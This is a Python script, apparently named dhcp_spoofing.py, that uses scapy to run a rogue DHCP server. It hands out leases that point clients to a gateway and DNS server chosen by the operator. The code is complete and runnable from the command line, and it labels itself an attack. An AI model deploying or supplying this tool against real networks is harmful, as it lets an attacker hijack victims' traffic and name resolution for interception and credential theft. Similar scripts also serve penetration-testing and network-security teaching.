from scapy.all import AnsweringMachine, get_if_addr, sendp, Net, itom, ltoa, atol,six
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.packet import Packet
import sys
import os
from collections.abc import Iterable
import logging

#
#   BOOTP_am and DHCP_am code copied from https://github.com/secdev/scapy/blob/master/scapy/layers/dhcp.py#L454-L474
#   modified in order to include extra DHCP options
#
class BOOTP_am(AnsweringMachine):
    function_name = "bootpd"
    filter = "udp and port 68 and port 67"
    send_function = staticmethod(sendp)

    def parse_options(self, pool_start = "10.0.2.1", pool_end = "10.0.2.20", network_mask="255.255.255.0", gw="10.0.2.254", dns="10.0.3.1", # noqa: E501
                      domain="localnet", renewal_time=600, lease_time=1800, server_id = "10.0.2.254"):
        self.domain = domain

        pool = []

        for addr in range(atol(pool_start),atol(pool_end)+1):
            pool.append(ltoa(addr))

        self.netmask = network_mask
        self.network = ltoa(atol(pool_start) & atol(network_mask))
        self.broadcast = ltoa(atol(self.network) | (0xffffffff & ~atol(network_mask)))
        self.gw = gw
        self.server_id = server_id
        self.dns = dns
        if isinstance(pool, Iterable):
            pool = [k for k in pool if k not in [gw, self.network, self.broadcast, dns]]  # noqa: E501
            pool.reverse()
        if len(pool) == 1:
            pool, = pool
        self.pool = pool
        self.lease_time = lease_time
        self.renewal_time = renewal_time
        self.leases = {}

    def is_request(self, req):
        if not req.haslayer(BOOTP):
            return 0
        reqb = req.getlayer(BOOTP)
        if reqb.op != 1:
            return 0
        return 1

    def print_reply(self, req, reply):
        if reply.getlayer(DHCP).options[0][1] == 5:
            print("Leased address %s" % (reply.getlayer(BOOTP).yiaddr))

    def make_reply(self, req):
        mac = req[Ether].src
        if isinstance(self.pool, list):
            if mac not in self.leases:
                self.leases[mac] = self.pool.pop()
            ip = self.leases[mac]
        else:
            ip = self.pool

        repb = req.getlayer(BOOTP).copy()
        repb.op = "BOOTREPLY"
        repb.yiaddr = ip
        repb.siaddr = self.gw
        repb.ciaddr = self.gw
        repb.giaddr = self.gw
        del(repb.payload)
        rep = Ether(dst=mac) / IP(dst=ip) / UDP(sport=req.dport, dport=req.sport) / repb  # noqa: E501
        return rep

class DHCP_am(BOOTP_am):
    function_name = "dhcpd"

    def make_reply(self, req):
        resp = BOOTP_am.make_reply(self, req)
        if DHCP in req:
            dhcp_options = [(op[0], {1: 2, 3: 5}.get(op[1], op[1]))
                            for op in req[DHCP].options
                            if isinstance(op, tuple) and op[0] == "message-type"]  # noqa: E501
            dhcp_options += [("server_id", self.server_id),
                             ("domain", self.domain),
                             ("router", self.gw),
                             ("name_server", self.dns),
                             ("domain_server", self.dns),
                             ("broadcast_address", self.broadcast),
                             ("subnet_mask", self.netmask),
                             ("renewal_time", self.renewal_time),
                             ("lease_time", self.lease_time),
                             "end"
                             ]
            resp /= DHCP(options=dhcp_options)
        return resp

def help_text():
    logging.warn("\nUsage:\n python dhcp_spoofing.py interface pool_start pool_end subnet_mask gateway dns_server\nExample:\n python dhcp_spoofing.py eth0 10.0.2.1 10.0.2.20 255.255.255.0 10.0.2.254 10.0.3.1")
    sys.exit()


if __name__ == "__main__":
    if len(sys.argv) < 4:
        help_text()

    interface = sys.argv[1]
    pool_start = sys.argv[2]
    pool_end = sys.argv[3]
    mask = sys.argv[4]
    gw = sys.argv[5]
    dns_server = sys.argv[6]
      
    dhcp_server = DHCP_am(iface=interface,pool_start = pool_start ,pool_end = pool_end,network_mask=mask, gw=gw, dns=dns_server, server_id = get_if_addr(interface))

    try:
        dhcp_server()
    except KeyboardInterrupt:
        logging.info("Stopping attack")